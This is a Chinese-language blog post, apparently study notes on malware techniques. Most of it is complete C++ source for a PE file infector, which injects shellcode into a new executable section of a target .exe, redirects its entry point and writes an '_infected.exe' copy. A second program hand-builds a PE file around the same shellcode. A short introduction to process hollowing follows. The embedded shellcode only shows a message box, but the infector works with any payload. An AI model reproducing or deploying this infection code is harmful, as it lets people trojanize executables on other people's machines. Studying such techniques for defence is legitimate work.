<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>恶意程式前线战术指南笔记 | The Blog of Monoceros406</title><meta name="author" content="Monoceros406"><meta name="copyright" content="Monoceros406"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="恶意程式前线战术指南笔记档案映射PE蠕虫感染1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;iostream&gt;#include &lt;W">
<meta property="og:type" content="article">
<meta property="og:title" content="恶意程式前线战术指南笔记">
<meta property="og:url" content="https://monoceros406.github.io/2024/10/16/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BC%8F%E5%89%8D%E7%BA%BF%E6%88%98%E6%9C%AF%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="The Blog of Monoceros406">
<meta property="og:description" content="恶意程式前线战术指南笔记档案映射PE蠕虫感染1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;iostream&gt;#include &lt;W">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://monoceros406.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2024-10-16T11:07:12.000Z">
<meta property="article:modified_time" content="2024-10-28T10:59:28.616Z">
<meta property="article:author" content="Monoceros406">
<meta property="article:tag" content="逆向工程">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://monoceros406.github.io/img/avatar.jpg"><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://monoceros406.github.io/2024/10/16/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BC%8F%E5%89%8D%E7%BA%BF%E6%88%98%E6%9C%AF%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '恶意程式前线战术指南笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-28 18:59:28'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="The Blog of Monoceros406" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">293</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://t.alcy.cc/ycy')"><nav id="nav"><span id="blog-info"><a href="/" title="The Blog of Monoceros406"><span class="site-name">The Blog of Monoceros406</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">恶意程式前线战术指南笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-16T11:07:12.000Z" title="发表于 2024-10-16 19:07:12">2024-10-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-28T10:59:28.616Z" title="更新于 2024-10-28 18:59:28">2024-10-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="恶意程式前线战术指南笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="恶意程式前线战术指南笔记"><a href="#恶意程式前线战术指南笔记" class="headerlink" title="恶意程式前线战术指南笔记"></a>恶意程式前线战术指南笔记</h1><h2 id="档案映射"><a href="#档案映射" class="headerlink" title="档案映射"></a>档案映射</h2><h3 id="PE蠕虫感染"><a href="#PE蠕虫感染" class="headerlink" title="PE蠕虫感染"></a>PE蠕虫感染</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable : 4996)</span></span><br><span class="line"> <span class="comment">/* Title:    	   User32-free Messagebox Shellcode for All Windows</span></span><br><span class="line"><span class="comment">  * Author:		   Giuseppe D&#x27;Amore</span></span><br><span class="line"><span class="comment">  * Size: 		   113 byte (NULL free)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="type">char</span> x86_nullfree_msgbox[] =</span><br><span class="line">	<span class="string">&quot;\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42&quot;</span></span><br><span class="line">	<span class="string">&quot;\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03&quot;</span></span><br><span class="line">	<span class="string">&quot;\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b&quot;</span></span><br><span class="line">	<span class="string">&quot;\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e&quot;</span></span><br><span class="line">	<span class="string">&quot;\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c&quot;</span></span><br><span class="line">	<span class="string">&quot;\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74&quot;</span></span><br><span class="line">	<span class="string">&quot;\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe&quot;</span></span><br><span class="line">	<span class="string">&quot;\x49\x0b\x31\xc0\x51\x50\xff\xd7&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">readBinFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span> fileName[], <span class="type">char</span>** bufPtr, DWORD&amp; length)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (FILE* fp = <span class="built_in">fopen</span>(fileName, <span class="string">&quot;rb&quot;</span>)) &#123;</span><br><span class="line">		<span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">		length = <span class="built_in">ftell</span>(fp);</span><br><span class="line">		*bufPtr = <span class="keyword">new</span> <span class="type">char</span>[length + <span class="number">1</span>];</span><br><span class="line">		<span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">		<span class="built_in">fread</span>(*bufPtr, <span class="built_in">sizeof</span>(<span class="type">char</span>), length, fp);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[!] usage: ./PE_Patcher.exe [path/to/file]&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">char</span>* buff; DWORD fileSize;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">readBinFile</span>(argv[<span class="number">1</span>], &amp;buff, fileSize)) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[!] selected file not found.&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="meta">#<span class="keyword">define</span> getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)-&gt;e_lfanew))</span></span><br><span class="line">	<span class="meta">#<span class="keyword">define</span> getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)getNtHdr(buf) + sizeof(IMAGE_NT_HEADERS)))</span></span><br><span class="line">	<span class="meta">#<span class="keyword">define</span> P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[+] malloc memory for outputed *.exe file.&quot;</span>);</span><br><span class="line">	<span class="type">size_t</span> sectAlign = <span class="built_in">getNtHdr</span>(buff)-&gt;OptionalHeader.SectionAlignment, fileAlign = <span class="built_in">getNtHdr</span>(buff)-&gt;OptionalHeader.FileAlignment, finalOutSize = fileSize + <span class="built_in">P2ALIGNUP</span>(<span class="built_in">sizeof</span>(x86_nullfree_msgbox), fileAlign);</span><br><span class="line">	<span class="type">char</span>* outBuf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(finalOutSize);</span><br><span class="line">	<span class="built_in">memcpy</span>(outBuf, buff, fileSize);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[+] create a new section to store shellcode.&quot;</span>);</span><br><span class="line">	<span class="keyword">auto</span> sectArr = <span class="built_in">getSectionArr</span>(outBuf);</span><br><span class="line">	PIMAGE_SECTION_HEADER lastestSecHdr = &amp;sectArr[<span class="built_in">getNtHdr</span>(outBuf)-&gt;FileHeader.NumberOfSections - <span class="number">1</span>];</span><br><span class="line">	PIMAGE_SECTION_HEADER newSectionHdr = lastestSecHdr + <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(newSectionHdr-&gt;Name, <span class="string">&quot;30cm.tw&quot;</span>, <span class="number">8</span>);</span><br><span class="line">	newSectionHdr-&gt;Misc.VirtualSize = <span class="built_in">P2ALIGNUP</span>(<span class="built_in">sizeof</span>(x86_nullfree_msgbox), sectAlign);</span><br><span class="line">	newSectionHdr-&gt;VirtualAddress = <span class="built_in">P2ALIGNUP</span>((lastestSecHdr-&gt;VirtualAddress + lastestSecHdr-&gt;Misc.VirtualSize), sectAlign);</span><br><span class="line">	newSectionHdr-&gt;SizeOfRawData = <span class="built_in">sizeof</span>(x86_nullfree_msgbox);</span><br><span class="line">	newSectionHdr-&gt;PointerToRawData = lastestSecHdr-&gt;PointerToRawData + lastestSecHdr-&gt;SizeOfRawData;</span><br><span class="line">	newSectionHdr-&gt;Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;</span><br><span class="line">	<span class="built_in">getNtHdr</span>(outBuf)-&gt;FileHeader.NumberOfSections += <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[+] pack x86 shellcode into new section.&quot;</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(outBuf + newSectionHdr-&gt;PointerToRawData, x86_nullfree_msgbox, <span class="built_in">sizeof</span>(x86_nullfree_msgbox));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[+] repair virtual size. (consider *.exe built by old compiler)&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">1</span>; i &lt; <span class="built_in">getNtHdr</span>(outBuf)-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">		sectArr[i - <span class="number">1</span>].Misc.VirtualSize = sectArr[i].VirtualAddress - sectArr[i - <span class="number">1</span>].VirtualAddress;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[+] fix image size in memory.&quot;</span>);</span><br><span class="line">	<span class="built_in">getNtHdr</span>(outBuf)-&gt;OptionalHeader.SizeOfImage = <span class="built_in">getSectionArr</span>(outBuf)[<span class="built_in">getNtHdr</span>(outBuf)-&gt;FileHeader.NumberOfSections - <span class="number">1</span>].VirtualAddress + <span class="built_in">getSectionArr</span>(outBuf)[<span class="built_in">getNtHdr</span>(outBuf)-&gt;FileHeader.NumberOfSections - <span class="number">1</span>].Misc.VirtualSize;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[+] point EP to shellcode.&quot;</span>);</span><br><span class="line">	<span class="built_in">getNtHdr</span>(outBuf)-&gt;OptionalHeader.AddressOfEntryPoint = newSectionHdr-&gt;VirtualAddress;</span><br><span class="line">	<span class="type">char</span> outputPath[MAX_PATH];</span><br><span class="line">	<span class="built_in">memcpy</span>(outputPath, argv[<span class="number">1</span>], <span class="built_in">sizeof</span>(outputPath));</span><br><span class="line">	<span class="built_in">strcpy</span>(<span class="built_in">strrchr</span>(outputPath, <span class="string">&#x27;.&#x27;</span>), <span class="string">&quot;_infected.exe&quot;</span>);</span><br><span class="line">	FILE* fp = <span class="built_in">fopen</span>(outputPath, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	<span class="built_in">fwrite</span>(outBuf, <span class="number">1</span>, finalOutSize, fp);</span><br><span class="line">	<span class="built_in">fclose</span>(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] file saved at %s\n&quot;</span>, outputPath);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[+] done.&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="连结器"><a href="#连结器" class="headerlink" title="连结器"></a>连结器</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> file_align 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> sect_align 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> P2ALIGNUP(size, align) ((((size) / align) + 1) * (align))</span></span><br><span class="line"><span class="type">char</span> x86_nullfree_msgbox[] =</span><br><span class="line">	<span class="string">&quot;\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42&quot;</span></span><br><span class="line">	<span class="string">&quot;\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03&quot;</span></span><br><span class="line">	<span class="string">&quot;\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b&quot;</span></span><br><span class="line">	<span class="string">&quot;\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e&quot;</span></span><br><span class="line">	<span class="string">&quot;\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c&quot;</span></span><br><span class="line">	<span class="string">&quot;\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74&quot;</span></span><br><span class="line">	<span class="string">&quot;\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe&quot;</span></span><br><span class="line">	<span class="string">&quot;\x49\x0b\x31\xc0\x51\x50\xff\xd7&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">size_t</span> peHeaderSize = <span class="built_in">P2ALIGNUP</span>(<span class="built_in">sizeof</span>(IMAGE_DOS_HEADER) + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER), file_align);</span><br><span class="line">	<span class="type">size_t</span> sectionDataSize = <span class="built_in">P2ALIGNUP</span>(<span class="built_in">sizeof</span>(x86_nullfree_msgbox), file_align);</span><br><span class="line">	<span class="type">char</span>* peData = (<span class="type">char</span>*)<span class="built_in">calloc</span>(peHeaderSize + sectionDataSize, <span class="number">1</span>);</span><br><span class="line">	<span class="comment">// DOS</span></span><br><span class="line">	PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)peData;</span><br><span class="line">	dosHdr-&gt;e_magic = IMAGE_DOS_SIGNATURE; <span class="comment">// MZ</span></span><br><span class="line">	dosHdr-&gt;e_lfanew = <span class="built_in">sizeof</span>(IMAGE_DOS_HEADER);</span><br><span class="line">	<span class="comment">// NT</span></span><br><span class="line">	PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(peData + dosHdr-&gt;e_lfanew);</span><br><span class="line">	ntHdr-&gt;Signature = IMAGE_NT_SIGNATURE; <span class="comment">// PE</span></span><br><span class="line">	ntHdr-&gt;FileHeader.Machine = IMAGE_FILE_MACHINE_I386;</span><br><span class="line">	ntHdr-&gt;FileHeader.Characteristics = IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_32BIT_MACHINE;</span><br><span class="line">	ntHdr-&gt;FileHeader.SizeOfOptionalHeader = <span class="built_in">sizeof</span>(IMAGE_OPTIONAL_HEADER);</span><br><span class="line">	ntHdr-&gt;FileHeader.NumberOfSections = <span class="number">1</span>;</span><br><span class="line">	<span class="comment">// Section</span></span><br><span class="line">	PIMAGE_SECTION_HEADER sectHdr = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)ntHdr + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;(sectHdr-&gt;Name), <span class="string">&quot;30cm.tw&quot;</span>, <span class="number">8</span>);</span><br><span class="line">	sectHdr-&gt;VirtualAddress = <span class="number">0x1000</span>;</span><br><span class="line">	sectHdr-&gt;Misc.VirtualSize = <span class="built_in">P2ALIGNUP</span>(<span class="built_in">sizeof</span>(x86_nullfree_msgbox), sect_align);</span><br><span class="line">	sectHdr-&gt;SizeOfRawData = <span class="built_in">sizeof</span>(x86_nullfree_msgbox);</span><br><span class="line">	sectHdr-&gt;PointerToRawData = peHeaderSize;</span><br><span class="line">	<span class="built_in">memcpy</span>(peData + peHeaderSize, x86_nullfree_msgbox, <span class="built_in">sizeof</span>(x86_nullfree_msgbox));</span><br><span class="line">	sectHdr-&gt;Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;</span><br><span class="line">	ntHdr-&gt;OptionalHeader.AddressOfEntryPoint = sectHdr-&gt;VirtualAddress;</span><br><span class="line">	ntHdr-&gt;OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR32_MAGIC;</span><br><span class="line">	ntHdr-&gt;OptionalHeader.BaseOfCode = sectHdr-&gt;VirtualAddress; <span class="comment">// .text RVA</span></span><br><span class="line">	ntHdr-&gt;OptionalHeader.BaseOfData = <span class="number">0x0000</span>;                  <span class="comment">// .data RVA</span></span><br><span class="line">	ntHdr-&gt;OptionalHeader.ImageBase = <span class="number">0x400000</span>;</span><br><span class="line">	ntHdr-&gt;OptionalHeader.FileAlignment = file_align;</span><br><span class="line">	ntHdr-&gt;OptionalHeader.SectionAlignment = sect_align;</span><br><span class="line">	ntHdr-&gt;OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;</span><br><span class="line">	ntHdr-&gt;OptionalHeader.SizeOfImage = sectHdr-&gt;VirtualAddress + sectHdr-&gt;Misc.VirtualSize;</span><br><span class="line">	ntHdr-&gt;OptionalHeader.SizeOfHeaders = peHeaderSize;</span><br><span class="line">	ntHdr-&gt;OptionalHeader.MajorSubsystemVersion = <span class="number">5</span>;</span><br><span class="line">	ntHdr-&gt;OptionalHeader.MinorSubsystemVersion = <span class="number">1</span>;</span><br><span class="line">	FILE* fp = <span class="built_in">fopen</span>(<span class="string">&quot;poc.exe&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	<span class="built_in">fwrite</span>(peData, peHeaderSize + sectionDataSize, <span class="number">1</span>, fp);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="Process-Hollowing"><a href="#Process-Hollowing" class="headerlink" title="Process Hollowing"></a>Process Hollowing</h3><p>越南国家级网军组织海莲花Ocean Lotus曾用过该技术。把一支具有数位签名的程式执行成进程，再将进程中已挂载的PE模组替换为恶意程式模组。PEB咨询体的ImageBaseAddress栏位储存主要执行程式的映像基址。此小节为x86工程。</p>
